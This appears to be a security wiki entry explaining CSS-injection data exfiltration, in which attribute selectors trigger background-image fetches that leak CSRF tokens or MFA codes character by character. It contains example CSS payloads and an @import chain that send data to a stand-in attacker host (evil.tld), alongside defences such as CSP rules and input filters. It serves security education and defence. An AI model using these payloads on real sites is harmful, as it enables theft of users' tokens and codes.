---
title: CSS-injection exfiltration
slug: css-injection-exfiltration
---

> **TL;DR:** A CSS-only injection point on a logged-in page can leak secret DOM text (CSRF tokens, MFA codes) one character at a time by triggering background-image fetches whose URL depends on whether an attribute-selector matched.

## What it is
If an attacker controls a `<style>` block or a `style=` attribute on a sensitive page, no JavaScript is needed to exfiltrate data. CSS attribute selectors (`input[value^="a"]`) can be paired with `background-image: url(...)` so the browser only fetches the URL when the selector matches. The attacker iterates the prefix and reconstructs the secret character-by-character. The technique is the canonical CSP-bypass exfil channel because CSP `style-src` is usually far looser than `script-src`.

## Preconditions / where it applies
- An injection sink for raw CSS (a stored colour preference, a custom-theme field, SVG `<style>`, or HTML injection that survives sanitisation but blocks `<script>`).
- A secret rendered into a DOM attribute or text node on the same page — typical targets: CSRF token in a hidden input, `value=` on an MFA code, password manager autofill.
- A browser that still permits `@import` chains and sequential repaints (Chromium / Firefox both work).

## Technique
Recursive attribute-selector exfil:

```html
<style>
input[name="csrf"][value^="a"] { background: url(https://evil.tld/a); }
input[name="csrf"][value^="b"] { background: url(https://evil.tld/b); }
/* ...for every charset char */
</style>
```

Only the matching rule's URL is fetched, revealing the first char. To get the next char without reloading the page, use sequential `@import` of attacker pages that observe which rules fired and then emit the next layer of rules — Sebastian Lekies' "CSS exfil" and Pepe Vila's "CSS keylogger" demonstrate this. Modern variants:

- **`:has()` selector** — exfiltrate parent state based on child text since 2023.
- **Font-ligature timing** — a custom font with conditional ligatures changes element width, observable via media-query or scrollbar.
- **`view-transition-name`** triggers an image only when an element has a specific computed value.
- **Single-char leak** is fine for short tokens; for long secrets, prepend the known prefix so each round only tests the next char (O(n*alphabet) requests).

Useful pattern for stored CSS (e.g. AEM client libs, dashboards with theme JSON):

```css
@import url(//evil.tld/css?p=);
```

Then the attacker server returns the next batch of selectors based on the prefix already known.

## Detection and defence
- CSP `style-src 'self'` + Trusted Types + sanitiser that strips `<style>` and `style=` attributes from user content (DOMPurify allows it by default — disable).
- Render secret values as POST-only body content fetched via a same-origin XHR with `X-Requested-With`, not as HTML attributes on a public page.
- `Content-Security-Policy: img-src 'self'` and `font-src 'self'` raise the exfil bar; combine with `connect-src` for fetch.
- Server-side: cap the size and charset of theme / colour inputs; reject `@import`, `url(`, `expression(`, `\` escapes.
- Logs: bursts of distinct URL paths with single-char suffixes from one client are a strong indicator.

See also [[content-security-policy-bypass]], [[xs-leaks]], [[html-injection]].

## References
- [PortSwigger – CSS injection](https://portswigger.net/research/blind-css-exfiltration) — blind CSS exfil paper
- [HackTricks – CSS injection](https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html) — selector tricks catalogue
- [d0nut – CSS exfil with `:has()`](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b) — modern :has-selector primitive
